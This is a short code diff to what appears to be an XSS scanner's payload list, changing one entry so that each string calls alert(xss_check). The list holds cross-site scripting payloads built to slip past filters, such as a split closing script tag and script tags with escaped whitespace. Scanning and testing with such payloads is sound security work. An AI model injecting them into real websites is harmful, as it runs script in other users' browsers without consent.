@@ -1,5 +1,5 @@
 payloads = [
-"</scrip</script>t><img src =q onerror=prompt(8)>",
+"</scrip</script>t><img src =q onerror=alert(xss_check)>",
 '<script\x20type="text/javascript">javascript:alert(xss_check);</script>',
 '<script\x3Etype="text/javascript">javascript:alert(xss_check);</script>',
 '<script\x0Dtype="text/javascript">javascript:alert(xss_check);</script>',
